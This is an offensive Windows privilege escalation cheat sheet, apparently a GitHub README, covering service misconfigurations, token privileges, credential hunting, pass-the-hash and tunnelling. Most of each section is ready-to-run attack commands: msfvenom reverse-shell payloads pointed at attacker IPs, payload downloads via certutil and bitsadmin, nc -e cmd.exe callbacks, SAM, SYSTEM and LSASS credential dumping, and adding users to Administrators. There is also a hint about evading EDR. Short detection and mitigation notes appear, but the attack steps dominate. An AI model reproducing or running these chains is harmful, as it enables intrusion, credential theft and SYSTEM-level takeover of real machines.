#####################################
Windows Privilege Escalation Examples
#####################################

<details>
<summary>Weak Service Permissions</summary>
 <br> 
========================
 
In Windows, services running as LocalSystem (highest privilege) with non-default or writable executable paths and weak permissions can be exploited for privilege escalation. This document provides detection, exploitation, and remediation steps.

🔍 1. Enumerate Services Running as LocalSystem with Non-Standard Paths
These services might use custom paths (e.g., C:\Users\Public\svc.exe) instead of the protected default (C:\Windows\System32).

✅ PowerShell:

    Get-WmiObject Win32_Service | Where-Object {
    $_.StartName -eq "LocalSystem" -and
    $_.PathName -notlike "C:\Windows\System32*"
    } | Select-Object Name, StartName, PathName

    
✅ WMIC:
cmd

    wmic service get name,startname,pathname | findstr /i "LocalSystem" | findstr /v /i "C:\\Windows\\System32"
<img width="1016" height="237" alt="image" src="https://github.com/user-attachments/assets/b58cd5a7-6d2d-4bba-b200-baa7cc66faee" />
🔐 2. Check Permissions on Service Configuration
Use AccessChk to determine whether a user can start, stop, configure, or modify a service.

✅ Command:
cmd

    .\accesschk64.exe /accepteula -uwcqv user servicename
Look for permissions like:

Permission	Meaning
SERVICE_ALL_ACCESS	Full control
SERVICE_CHANGE_CONFIG	Can change service binary path
WRITE_DAC / WRITE_OWNER	Can escalate to full control
GENERIC_WRITE / GENERIC_ALL	Equivalent to full control
<img width="939" height="407" alt="image" src="https://github.com/user-attachments/assets/e4ea7ead-9a28-4752-9e52-74c28bc09e8b" />

📂 3. Identify Writable Service Executables
✅ Export Executable Paths:

    for /f "tokens=2 delims='='" %a in ('wmic service list full ^| find /i "pathname" ^| find /v /i "system32"') do @echo %a >> C:\Windows\Temp\services.txt
✅ If wmic is not available:
cmd

    sc query state= all | findstr "SERVICE_NAME:" >> servicenames.txt
    FOR /F "tokens=2 delims= " %i in (servicenames.txt) DO @echo %i >> services.txt
    FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
✅ Check Permissions:
cmd

    for /f "delims=" %a in (C:\Windows\Temp\services.txt) do accesschk.exe /accepteula -qv "%a" >> accesschk.txt
Or use icacls/cacls:

    for /f "delims=" %a in (C:\Windows\Temp\services.txt) do icacls "%a" >> icacls.txt
Look for:

Symbol	Meaning
(F)	Full Access
(M)	Modify Access
(W)	Write Access
(WDAC)	Write DACL
(WO)	Write Owner

⚙️ 4. Exploitation Steps
✅ 4.1 Replace the Service Executable
Generate a reverse shell payload (Metasploit):

bash

    msfvenom -p windows/powershell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o reverse_priv.exe
Host it:

bash

    python3 -m http.server 8999
Transfer to target:

powershell

    wget http://<attacker_ip>:8999/reverse_priv.exe -o reverse_priv.exe
Overwrite service binary:

powershell

    copy reverse_priv.exe "C:\Path\To\Service.exe"
✅ 4.2 Start the Service
c

    sc start <service>
Or:

cmd

    net start <service>
⚡ 5. Writable Service Object Exploitation
✅ Find Writable Service Objects
cmd

    accesschk.exe /accepteula -uwcqv "Authenticated Users" *
✅ Update Service Binary Path
cmd

    sc config <service> binPath= "C:\Path\To\reverse_priv.exe"
Remove dependencies if blocking:

cmd

    sc config <service> depend= ""
Change service start mode to manual:

cmd

    sc config <service> start= demand
Update service to run as SYSTEM:

c

    sc config <service> obj= ".\LocalSystem" password= ""
✅ Start/Stop Service:
cmd

    sc stop <service>
sc start <service>
Or:

cmd

    net stop <service>
    net start <service>
🧪 6. Validate Exploitability
powershell

    Get-WmiObject Win32_Service -Filter "Name='<service>'" |Select-Object Name, DisplayName, StartMode, State, StartName, PathName
<img width="1064" height="161" alt="image" src="https://github.com/user-attachments/assets/6fdbbea7-d56e-4cb4-80a3-4f9016f995c8" />
    
🤖 7. Automated Enumeration
✅ SharpUp
Use SharpUp.exe for automated privilege escalation checks.

cmd

    SharpUp.exe --services
    or: SharpUp.exe audit
 <img width="974" height="482" alt="image" src="https://github.com/user-attachments/assets/b36466e1-923a-4ddb-8188-bcfb99ac4c76" />
   
✅ Summary of Exploit Steps
Step	Description
🔍 1	Find services running as LocalSystem with writable paths
🔐 2	Check if current user can change or control the service
💣 3	Replace binary with malicious payload
▶️ 4	Restart or trigger the service to execute payload
⚡ 5	Get SYSTEM-level shell

🔐 Remediation Checklist
✅ Always install services in C:\Windows\System32

✅ Set tight permissions using sc sdset or GPO

✅ Regularly audit services using:

 Sysinternals AccessChk

 PowerUp / SharpUp

✅ Enable AppLocker / Software Restriction Policies

✅ Monitor service creation/modification with Sysmon

</details>

<details>
<summary>SeBackupPrivilege</summary>
 <br> 
 ============================
 
🔑 What is SeBackupPrivilege?
SeBackupPrivilege is a special Windows permission intended for backup operations.

It allows a user to bypass file ACLs and read any file on the system — even highly sensitive ones like:

C:\Windows\System32\config\SAM

C:\Windows\System32\config\SYSTEM

Attackers can abuse this to extract password hashes and escalate privileges.

🔍 Step 1: Check for SeBackupPrivilege
After getting access (e.g., through Evil-WinRM), check assigned privileges:

powershell

    whoami /priv
   <img width="923" height="339" alt="image" src="https://github.com/user-attachments/assets/18ee9197-db13-4739-b7cf-69ffa64bdf96" />

✅ Look for SeBackupPrivilege in the output.

📁 Step 2: Dump Registry Hives
Create a Temp Directory and Dump SAM & SYSTEM
powershell

    cd C:\
    mkdir Temp
    reg save hklm\sam C:\Temp\sam
    reg save hklm\system C:\Temp\system
 <img width="766" height="416" alt="image" src="https://github.com/user-attachments/assets/5f011469-d495-42eb-8b76-fe2af58a191e" />
   
📥 Step 3: Transfer Files to Kali
Use Evil-WinRM's built-in download command:

powershell

    cd Temp
    download sam
    download system
 <img width="563" height="298" alt="image" src="https://github.com/user-attachments/assets/178f145f-cb49-4cb4-9f82-6e1e424d6658" />
   
🔓 Step 4: Extract Hashes on Kali
🐍 Option 1: Using PyPyKatz
bash

    pypykatz registry --sam sam system
✅ This will output NTLM hashes like:
<img width="1021" height="296" alt="image" src="https://github.com/user-attachments/assets/cf46c206-5e73-4c69-ba4b-3ab653fe5069" />


Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e0375cf8e440aa58a809d57edd78996::
🧰 Option 2: Using Impacket’s secretsdump.py

    cd ~/impacket
    python3 -m venv impacket-env
    source impacket-env/bin/activate
    secretsdump.py -system /home/kali/system -sam /home/kali/sam LOCAL
 <img width="1056" height="320" alt="image" src="https://github.com/user-attachments/assets/9fa97eb3-93ba-496e-9418-ecb08ed1bb24" />
   
🚪 Step 5: Lateral Movement / Privilege Escalation
Use the extracted NTLM hash to pivot or escalate.

🛠️ Option 1: Evil-WinRM (Pass-the-Hash)

evil-winrm -i <target-ip> -u <domain\user> -H <NTLM-hash>
Example:

    evil-winrm -i 192.168.216.130 -u corp\administrator -H 5e0375cf8e440aa58a809d57edd78996
🛠️ Option 2: CrackMapExec

    crackmapexec smb <target-ip> -u Administrator -H <NTLM-hash>
🛠️ Option 3: PsExec (from Impacket)

    psexec.py Administrator@<target-ip> -hashes :<NTLM-hash>
🧑‍💼 Bonus: Enumerate Users (Optional)
If you need to look up domain users on a DC:

powershell

    Get-ADUser -Filter * | Select-Object Name, SamAccountName
Requires ActiveDirectory module, usually available on domain controllers.

🔚 Summary
Step	Action
1️⃣	Check if user has SeBackupPrivilege
2️⃣	Dump SAM and SYSTEM hives using reg save
3️⃣	Download files using evil-winrm
4️⃣	Extract hashes with pypykatz or secretsdump.py
5️⃣	Reuse hashes with Evil-WinRM, CrackMapExec, or PsExec for lateral movement or privilege escalation

 </details>

 <details>
<summary>SeImpersonatePrivilege</summary>
 <br>
  =====================
  
🔍 What is SeImpersonatePrivilege?
The SeImpersonatePrivilege is a powerful permission in Windows that allows a user to impersonate the security context of another user. This is typically used by services to act on behalf of a client.

✅ If a low-privileged user account has SeImpersonatePrivilege, it can often be exploited to escalate to SYSTEM or Administrator using various impersonation attacks.

🧠 Why is it dangerous?
This privilege allows attackers to impersonate privileged tokens (like SYSTEM or admin) when certain services or RPC endpoints allow it.

It is commonly exploited in local privilege escalation (LPE) scenarios.

🔍 Identifying SeImpersonatePrivilege
Run this on the target system (PowerShell):

powershell

    whoami /priv | findstr SeImpersonatePrivilege
If you see it as Enabled, you can likely proceed with known exploits.
<img width="1041" height="362" alt="image" src="https://github.com/user-attachments/assets/aeb520d9-af88-4719-b8cb-4707dcabfedb" />

⚙️ Exploitation Tools
🔧 1. PrintSpoofer
PrintSpoofer abuses the SeImpersonatePrivilege via the Print Spooler service to impersonate SYSTEM.

🧪 Steps:
Upload the executable to the target system:

powershell

    upload PrintSpoofer.exe
<img width="1064" height="178" alt="image" src="https://github.com/user-attachments/assets/7d0e6a51-a786-4ae1-85a7-c54c65220d4c" />
    
Run PrintSpoofer to add your user to the Administrators group:

powershell

    .\PrintSpoofer.exe -i -c "net localgroup Administrators <user-name> /add"
-i → impersonate token

-c → command to execute as SYSTEM
<img width="1025" height="77" alt="image" src="https://github.com/user-attachments/assets/fed9f6a6-9e19-4292-9e6d-03c5d0059f91" />

✅ Your user is now part of the Administrators group.

🔧 2. GodPotato
GodPotato is a modern implementation of the RottenPotatoNG/JuicyPotato concept, abusing COM/RPC misconfigurations and SeImpersonate privilege to execute commands as SYSTEM.

🧪 Steps:
Upload the GodPotato executable:

powershell

    upload GodPotato-NET4.exe
Execute the command to add your user to the Administrators group:

powershell

.\GodPotato-NET4.exe -cmd "cmd /c net localgroup Administrators r.andrews /add"
✅ Once executed successfully, the user is elevated.
<img width="1052" height="574" alt="image" src="https://github.com/user-attachments/assets/ef72d9f6-4d43-45c8-8f50-7cca73d7e933" />

✅ Confirming Privilege Escalation
You can now verify that your user has admin access:

powershell

whoami /groups
net user <user-name>
Or list protected directories:

powershell

dir C:\Users\Administrator\
📌 Notes:
These exploits work only locally and require SeImpersonatePrivilege.

These tools may trigger EDR/AV, so obfuscation or alternative binaries might be needed.

Not all Windows builds are vulnerable; ensure the Print Spooler or vulnerable COM servers are available.

🧰 Alternative Tools & Techniques
Tool	Description
JuicyPotato	Legacy COM exploit, works only on older versions
RoguePotato	Bypasses newer Windows protections
PrintSpoofer	Exploits Print Spooler to impersonate SYSTEM
GodPotato	Updated COM exploit using .NET

📚 References
https://github.com/itm4n/PrintSpoofer

https://github.com/BeichenDream/GodPotato

  </details>
  
<details>
<summary>Unquoted Service Pathss</summary>
 <br> 

================================

🔧 Windows Privilege Escalation – Unquoted Service Path Exploit
🧠 Concept Summary
When a Windows service is registered with an unquoted executable path and contains spaces, Windows attempts to locate the executable by parsing the path from left to right, trying each path fragment with .exe appended. If an attacker can write to any of these directories, they can drop a malicious executable and gain privilege escalation when the service is started.

📌 Prerequisites
Attacker has low-privileged shell (RDP, reverse shell, etc.)

One or more services have unquoted paths

Attacker has write permissions to any folder in the service's executable path

🔍 Step 1: Enumeration
✅ Using SharpUp (automated):
powershell

    .\SharpUp.exe auto
✅ Using winPEAS (automated):
powershell

    .\winPEASany.exe all
<img width="1063" height="472" alt="image" src="https://github.com/user-attachments/assets/87a483f6-856f-44ec-9811-6222e88f6b3e" />

✅ Manually with sc:
powershell

    sc qc <ServiceName>
# Example:
sc qc unquotedsvc
Look for output like:

<img width="1039" height="338" alt="image" src="https://github.com/user-attachments/assets/ffd807da-a68d-4d6b-910a-7959ebdfa778" />


BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\service.exe
⚠️ Notice the path is unquoted and contains spaces.

✅ Find all unquoted services in one command:
powershell

wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
🔍 Step 2: Check Write Permissions
✅ Use accesschk.exe (from Sysinternals):
powershell

    accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
🔎 Look for:
[RW] BUILTIN\Users
Meaning: any user can write in that directory.
<img width="992" height="159" alt="image" src="https://github.com/user-attachments/assets/0beb539f-c833-41eb-8ed0-882fb1b87533" />

🎯 Step 3: Exploitation
✅ Upload Reverse Shell Payload
powershell

    copy reverse_shell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
⚠️ Name the payload according to where Windows would first look.
For path:
C:\Program Files\Unquoted Path Service\Common Files\service.exe
Windows may try:

C:\Program.exe

C:\Program Files.exe

C:\Program Files\Unquoted.exe

C:\Program Files\Unquoted Path.exe

C:\Program Files\Unquoted Path Service\Common.exe ← ✅ our injection point

Choose the earliest writable location in the path.

📞 Step 4: Start Listener (Kali)
bash

    nc -lvnp 4444
🚀 Step 5: Trigger the Service
powershell

    net start unquotedsvc
🧨 This starts the service and executes your malicious binary.
🎉 You now have a SYSTEM-level shell.
<img width="1064" height="321" alt="image" src="https://github.com/user-attachments/assets/27d6c468-3580-405f-b788-1725775f7e2b" />

🔐 Mitigation (Defender Notes)
Always quote service paths with spaces.

Restrict write permissions on system folders.

Use sc qc, GPO, or PowerShell auditing to periodically scan for misconfigurations.

✅ Checklist Summary
Task	Command/Tool
Enumerate Unquoted Paths	wmic, sc qc, SharpUp, winPEAS
Check Permissions	accesschk.exe
Upload Payload	copy reverse_shell.exe "Path"
Start Listener	nc -lvnp 4444
Start Service	net start <servicename>


</details>
<details>
<summary>Scheduled Task/Job</summary>
 <br> 
 =======================
 
Windows Task Scheduler allows users to schedule programs or scripts to run at specific times or system events. While this is a legitimate administrative feature, it can be abused by attackers for:

Privilege Escalation: If a scheduled task is executed with higher privileges, an attacker can inject or replace the associated executable to gain SYSTEM-level access.

Persistence: Scheduled tasks can ensure malware or shells re-execute after reboot or on a timed interval.

📌 Prerequisites
Low-privileged access to a Windows machine (e.g., via RDP or reverse shell).

Ability to read/write in directories where scheduled tasks point to executables.

OR permissions to create/modify tasks.

🔍 Step 1: Enumerate Scheduled Tasks
powershell

    schtasks /query /fo LIST /v
This lists all scheduled tasks in verbose format, including:

Task Name
Run As User
Executable Path
Schedule
Task State

📌 Look for:

Tasks run as NT AUTHORITY\SYSTEM

Executables located in user-writable paths (e.g., C:\Users\Public\, C:\ProgramData\, etc.)

🔥 Step 2: Create Malicious Executable (Reverse Shell)
Using MSFVenom to generate a reverse shell payload:

bash

    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.3 LPORT=8888 -f exe > shell.exe
Alternatively (⚙️ Alternative Payload Options):

Persistent Payload (Metasploit Meterpreter):

bash

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=4444 -f exe > meterpreter.exe
Custom EXE (compiled C# or PowerShell script using MSBuild):

Use tools like MSBuild, donut, Nim, or C# executables.

🎯 Step 3: Inject Malicious Executable
Rename Original Executable (optional backup):

powershell

    ren file.exe file.bak
Download your payload to the same location:

powershell

    powershell -c "Invoke-WebRequest http://192.168.1.3/shell.exe -OutFile file.exe"
🔁 Alternate download methods:

certutil:

powershell

    certutil -urlcache -split -f http://192.168.1.3/shell.exe file.exe
bitsadmin:

powershell

    bitsadmin /transfer myDownloadJob /download /priority high http://192.168.1.3/shell.exe C:\Temp\file.exe
Confirm file is placed and matches original name.

📞 Step 4: Start Netcat Listener on Attacker Machine
bash

    nc -lvnp 8888
🕒 Step 5: Wait for the Scheduled Task to Trigger
On next trigger (e.g., boot time, time interval), your malicious file.exe is executed.

You receive a SYSTEM shell back.

🛡️ Detection & Monitoring
📌 View Task Scheduler Logs
Enable Event Log:

    Microsoft-Windows-TaskScheduler/Operational
Check via Event Viewer:

arduino

    Event ID 106: Task registered
    Event ID 200: Task started
    Event ID 201: Task completed
📌 Task Query for Investigation
powershell

    schtasks /query /fo LIST /v
📌 File System Monitoring
Use tools like:

🔍 Sysinternals Autoruns: Detects auto-starting entries, including scheduled tasks
Autoruns[https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns]

🔍 Process Explorer: Investigates running processes and their privileges
Process Explorer[https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer]

🔍 TCPView: Monitors live TCP/UDP connections
TCPView[https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview]

🔀 Alternative Exploitation Scenarios
Scenario	Description
Writable Executable Path	Replace task's binary if stored in a writable location (e.g., C:\Users\Public\App.exe)
Create New Task (if user has rights)	Use schtasks /create to create a task running as SYSTEM
DLL Hijacking via Scheduled Task	If the task binary loads unmanaged DLLs unsafely, inject your malicious DLL
Startup Triggers	Abuse AtLogon, OnStartup, Daily triggers for persistence
Via COM objects / PowerShell WMI	Create tasks silently using PowerShell:

powershell

    $action = New-ScheduledTaskAction -Execute "shell.exe"
    $trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "PersistTask" -User "SYSTEM"
🔐 Mitigation Techniques
Defense	Description
Least Privilege Principle	Restrict ability to create/modify tasks to admin users only
Monitor Task Changes	Enable auditing of TaskScheduler logs
Protect File System	Secure executable paths used by tasks
Application Whitelisting	Prevent unauthorized executables (e.g., via AppLocker)
Regular Review	Periodic manual or automated audits of scheduled tasks

✅ Summary
Task	Command/Tool
Enumerate Tasks	schtasks /query /fo LIST /v
Create Payload	msfvenom -p windows/shell_reverse_tcp ...
Upload Payload	powershell wget, certutil, bitsadmin
Setup Listener	nc -lvnp <port>
Detect/Investigate	Event Viewer, Autoruns, Process Explorer, Sysmon
</details>

<details>
<summary>Cleartext Passwords</summary>
 <br> 

===================
After gaining initial access to a Windows system, attackers often look for cleartext or weakly encrypted passwords stored in configuration files, registry keys, or leftover deployment scripts. These credentials can lead to privilege escalation or access to other systems in the network.

🔎 1. Search for Passwords in Files
✅ Search common keywords in common text files:
cmd

    findstr /si password *.txt *.xml *.ini
Searches for password (case-insensitive) in .txt, .xml, and .ini files.

✅ Search all files for keywords like password:
cmd

    findstr /spin "password" *.*
/s: recurse subdirectories
/p: skip binary files
/i: case-insensitive
/n: include line numbers

✅ Search for filenames suggesting stored credentials:

    dir /s *pass* == *cred* == *vnc* == *.config*
Looks for files that likely contain credentials in their names.

🔁 Alternative Filename Searches:

cmd

    dir /s /b *pass*.*  
    dir /s /b *cred*.*  
    dir /s /b *secret*.*  
    dir /s /b *.config  
    dir /s /b *.ini  
🗂️ 2. Check Known Files Containing Credentials
These files are often left over from Windows installations, third-party applications, or RDP/VNC tools:

cmd

    type C:\sysprep.inf
    type C:\sysprep\sysprep.xml
    type C:\unattend.xml
    type %WINDIR%\Panther\Unattend\Unattended.xml
    type %WINDIR%\Panther\Unattended.xml
💡 These often contain Local Admin credentials used during unattended Windows installations.

📂 3. Look for Remote Desktop & VNC Credentials

    dir C:\*vnc.ini /s /b
    dir C:\*ultravnc.ini /s /b
    dir C:\ /s /b | findstr /si *vnc.ini
VNC applications often store saved passwords in these .ini files (sometimes base64 or weak XOR encoding).

🔁 Alternatives:

tightvnc.ini
realvnc.ini
*.rdp files

🧬 4. Search the Windows Registry for Stored Passwords
🔍 Search entire registry hives:

    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
🔎 Scans for REG_SZ values containing password.

🔎 Targeted Registry Keys

    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Look for DefaultPassword, AutoAdminLogon, etc. Can be used to autologin as local admin.

cmd

    reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
SNMP community strings may be stored here (used for network equipment access).

    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
PuTTY session passwords, IPs, saved usernames – can be decoded from registry manually or using tools like putty-creds.

    reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password
RealVNC stores encrypted passwords here. Can be cracked with tools like vncpwd.

💡 Extra Tip: Use PowerShell for Enhanced File Search
powershell

    Get-ChildItem -Recurse -Include *.xml,*.txt,*.ini -Path C:\ | 
    Select-String -Pattern "password" -SimpleMatch
More efficient and readable than findstr, especially with large directories.

📂 Locations Often Containing Secrets
Path	Description
C:\Users\<user>\AppData\Roaming\	App data, often includes creds
C:\ProgramData\	Global config files
C:\inetpub\wwwroot\	Web apps with DB connection strings
.git directories	May include .env, configs, hardcoded secrets
.rdp files	Remote Desktop files may store credentials
web.config, app.config	.NET config files with plaintext DB strings

🧰 Helpful Tools (Optional)
🛠️ Windows Credential Editor (WCE) – Dumps stored credentials.
🔎 LaZagne – Searches for stored passwords from various apps.
🧪 Mimikatz – Extracts plaintext credentials, tokens, and hashes from memory.
🔐 Secretsdump.py (Impacket) – Dumps credentials remotely via SMB.
🧾 NirSoft tools – GUI tools for saved browser, RDP, Outlook, etc., passwords.

🔐 Detection & Defense
Defense Strategy	Description
File Auditing	Monitor access to sensitive config and .xml, .ini, .rdp files
Registry Auditing	Use Sysmon + Event Logging to monitor suspicious registry access
Credential Scanning Tools	Use tools like truffleHog, gitleaks, or Stealthbits to scan systems/repos for secrets
Least Privilege	Avoid storing passwords in plaintext where possible, and restrict read permissions
Credential Manager	Use Windows Credential Locker or LSA to securely store secrets

✅ Summary Table
Task	Command
Find password in text files	findstr /si password *.txt *.xml *.ini
Search all files for keywords	findstr /spin "password" *.*
Search filenames	dir /s *pass*.*
Check common files	type c:\unattend.xml, etc.
Check registry	reg query HKLM /f password /t REG_SZ /s
PuTTY sessions	reg query HKCU\Software\SimonTatham\PuTTY\Sessions
VNC keys	reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v password


</details>
<details>
<summary>Passing the Hash</summary>
 <br> 
================
Passing the Hash is a post-exploitation technique that allows an attacker to authenticate using NTLM hashes without knowing the actual plaintext password. Instead of cracking hashes, the attacker reuses them directly to gain remote or local access under another user’s (typically admin) context.

🔍 Step 1: Dump NTLM Password Hashes
To perform PtH, you first need access to NTLM hashes. These can be obtained using credential-dumping tools:

✅ Common Hash Dumping Tools
cmd

    wce32.exe -w
    wce64.exe -w
    fgdump.exe
🧰 Alternative Hash Dumpers:

mimikatz.exe – Powerful credential extraction tool:

powershell

    sekurlsa::logonpasswords
lsass.dmp with secretsdump.py:

bash

    procdump64.exe -ma lsass.exe lsass.dmp
    secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL
LaZagne – Extracts saved creds from many apps

🌐 Passing the Hash – Remote Execution
Once you have an NTLM hash, you can use it to remotely authenticate and execute commands on other systems.

✅ Using pth-winexe
bash

    pth-winexe -U <domain>/<username>%<NTLM_hash> //<target-ip> cmd
🚩 Use Administrator or other privileged accounts for best results.

📌 Target Hostname Instead of IP

Some systems may require NetBIOS name resolution:

bash

    pth-winexe -U <domain>/<username>%<hash> //<hostname> cmd
🛠️ If hostname doesn't resolve, edit /etc/hosts:

php-template

    <target-ip>  <hostname>
✅ Using Environment Variable SMBHASH (Alternate Method)
bash

    export SMBHASH=<LM_hash>:<NTLM_hash>
    pth-winexe -U <domain>/<username>% //<target-ip> cmd
Useful if only one hash type is available (LM or NTLM).

🧠 Tip: If LM hash is not used, you can leave it as 00000000000000000000000000000000

✅ Using impacket's wmiexec.py or psexec.py
bash

    psexec.py -hashes :<NTLM_hash> <domain>/<user>@<ip>
    wmiexec.py -hashes :<NTLM_hash> <domain>/<user>@<ip>
🔁 Use -k or -no-pass flags depending on your setup.

🖥️ Passing the Hash – Local Execution
In some cases, you can use the NTLM hash locally on the same machine where the hash was dumped to escalate privileges.

✅ Using runas (Custom Build for PtH)
⚠️ Windows' built-in runas.exe does not support PtH natively. This method works only with modified or patched versions (e.g., via PowerShell Empire or tools like RunasCs).

cmd

    runas.exe /env /noprofile /user:<username> <hash> "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"
🧠 Note: You may need SeTcbPrivilege or SYSTEM-level context to impersonate other users with hashes locally.

✅ Using PowerShell (via Secure Strings)
powershell

    $secpasswd = ConvertTo-SecureString "<hash>" -AsPlainText -Force
    $mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
    $computer = "<hostname>"
    [System.Diagnostics.Process]::Start("C:\Windows\Temp\nc.exe","<attacker-ip> 53 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
⚠️ Limitation: This works with plaintext passwords, not hashes. For actual PtH, use Invoke-WMIExec or similar.

✅ Using PsExec (with hash)
cmd

    psexec64 \\<hostname> -u <username> -p <hash> -h "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"
Requires PsExec variant that supports PtH (e.g., in Sysinternals, Impacket, or custom fork).

🔁 Alternative Tools & Methods
Tool	Description
Impacket psexec.py / wmiexec.py	Native support for PtH
Evil-WinRM	Can authenticate with hashes, useful for remote shells
Invoke-WMIExec	PowerShell script for remote command execution
CrackMapExec	Swiss army knife for SMB enumeration + PtH
Rubeus	Can pass TGT tickets for lateral movement (Kerberos equivalent)
Smbexec	Wrapper for smbclient to execute using hashes

🧪 Example: Remote Shell via pth-winexe
bash

    pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:<NTLM_hash> //192.168.1.5 cmd
Result: Interactive cmd.exe shell as Administrator on the remote system.

🛡️ Detection & Mitigation
Defense Strategy	Description
🧼 Disable NTLM	Disable or limit NTLM authentication via GPO
🔐 Enforce SMB Signing	Prevents tampering with SMB messages
🔎 Log Event IDs	Monitor logs: 4624, 4648, 4776 for unusual logins
🔍 Monitor Tools	Detect usage of pth-*, psexec, mimikatz, etc.
🔒 Credential Guard	Protects LSASS from being dumped
📊 Use Sysmon	Track process creation + network connections

✅ Summary Cheat Sheet
Purpose	Command
Dump hashes (WCE)	wce64.exe -w
Remote PtH	pth-winexe -U domain/user%hash //ip cmd
Local PtH (PsExec)	psexec64 \\host -u user -p hash -h command
Set SMBHASH	export SMBHASH=LM:NTLM
Remote PtH (Impacket)	psexec.py -hashes :NTLM domain/user@ip


</details>
<details>
<summary>Loopback Services</summary>
 <br> 
=================
Loopback services are applications or services listening on 127.0.0.1 (localhost) only, meaning they cannot be accessed from outside the machine by default. However, if an attacker has local access (e.g., reverse shell, RDP, or low-privileged foothold), these internal services can be proxied or forwarded externally, and then abused — for example, to exploit internal APIs, web interfaces, or escalate privileges.

🔍 Step 1: Identify Loopback Services
Use netstat to check for services bound only to 127.0.0.1 (localhost):

cmd

    netstat -ano | findstr "LISTEN"
🔍 Look for entries like:

nginx

    TCP    127.0.0.1:8000    0.0.0.0:0    LISTENING    1234
Port 8000 is only available on loopback.

PID 1234 may correspond to a high-privilege service like an internal web API.

✅ Identify the service name behind the PID:
cmd

    tasklist /fi "PID eq 1234"
🔁 Step 2: Port Forward the Loopback Service to Attacker
You can remotely expose the local-only service using port forwarding over an SSH tunnel with plink.exe.

✅ Using plink.exe (SSH Reverse Tunnel):
cmd

    plink.exe -l <attacker-username> -pw <attacker-password> <attacker-ip> -R <attacker-port>:127.0.0.1:<target-port>
🔁 Example:
cmd

    plink.exe -l kali -pw P@ssw0rd 192.168.1.100 -R 9000:127.0.0.1:8000
This binds port 9000 on your attacking machine to the victim’s internal port 8000 (localhost). Now you can open http://localhost:9000 on your attacker box to access the internal service.

⚙️ Use Cases
Use Case	Example
🧪 Exploit internal web apps	HTTP admin panels only listening on 127.0.0.1
🔄 Abuse local privileged APIs	Exploit services like Jenkins, Redis, MySQL bound to localhost
📦 Pivot into internal systems	Forward 127.0.0.1:3306 (MySQL) and reuse credentials
🔐 Extract secrets	Vaults, config servers, DB admin panels (e.g., Mongo Express)

🛠️ Alternatives to plink.exe
✅ ssh from Linux (native):
bash

    ssh -R 9000:127.0.0.1:8000 attacker@attacker-ip
✅ chisel (More advanced tunneling over HTTP):
bash

# On attacker:
    chisel server -p 9001 --reverse

# On victim:
    chisel client attacker-ip:9001 R:9000:127.0.0.1:8000
✅ socat (bidirectional proxying):
bash

    socat TCP-LISTEN:9000,fork TCP:127.0.0.1:8000
✅ Invoke-SSHCommand / PSSession (PowerShell Remoting):
For environments with WinRM enabled:

powershell

    Enter-PSSession -ComputerName target -Credential $creds
    New-NetFirewallRule -DisplayName "Allow SSH Tunnel" -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow
🔐 Detection & Defense
Detection Technique	Description
🔍 Monitor Netstat Output	Look for services bound to 127.0.0.1
🧪 Check for Reverse SSH	Monitor plink.exe, ssh.exe, or chisel.exe processes
📊 Enable Sysmon Logging	Monitor for unusual child process or network connections
🔒 Restrict Loopback Services	Configure services to require authentication even on loopback
🛡️ Egress Filtering	Block outbound SSH, chisel, or tunneling ports
🧰 Use Application Firewalls	Restrict access to internal-only services using local firewalls

🧪 Example Scenario
✅ Find a local service:
pgsql

    127.0.0.1:8888 - PID 4321 - Web API for internal admin panel
✅ Tunnel it to attacker machine:
cmd

    plink.exe -l kali -pw kali 192.168.1.100 -R 8080:127.0.0.1:8888
✅ On Kali (attacker):
bash

    curl http://localhost:8080
💥 You now access a privileged local service remotely, possibly leading to RCE, token theft, or privilege escalation.

✅ Summary Cheat Sheet
Task	Command
List local ports	`netstat -ano
Identify process by PID	tasklist /fi "PID eq <pid>"
Tunnel with plink	plink.exe -R <LPORT>:127.0.0.1:<RPORT>
Tunnel with SSH	ssh -R <LPORT>:127.0.0.1:<RPORT> user@attacker-ip
Tunnel with chisel	chisel client attacker-ip:port R:...


</details>
<details>
<summary>AlwaysInstallElevated</summary>
 <br> 
=====================
 
🔍 Overview
AlwaysInstallElevated is a Windows policy setting that, when enabled, allows non-privileged users to install Microsoft Installer Packages (.msi files) with elevated (SYSTEM) privileges. This feature, originally intended for administrative convenience, becomes a serious security misconfiguration if both user-level and machine-level policies are enabled simultaneously.

⚠️ If both registry keys (HKCU and HKLM) have AlwaysInstallElevated = 1, any user can install MSI files with SYSTEM-level privileges.

🧪 Detection
Before exploitation, you need to check if the target machine is misconfigured:

✅ Check via Registry
powershell

    reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Both keys must return AlwaysInstallElevated REG_DWORD 0x1 for the system to be vulnerable.
<img width="1061" height="261" alt="image" src="https://github.com/user-attachments/assets/3fad82f8-9c74-4d4d-9290-96e62ce68605" />

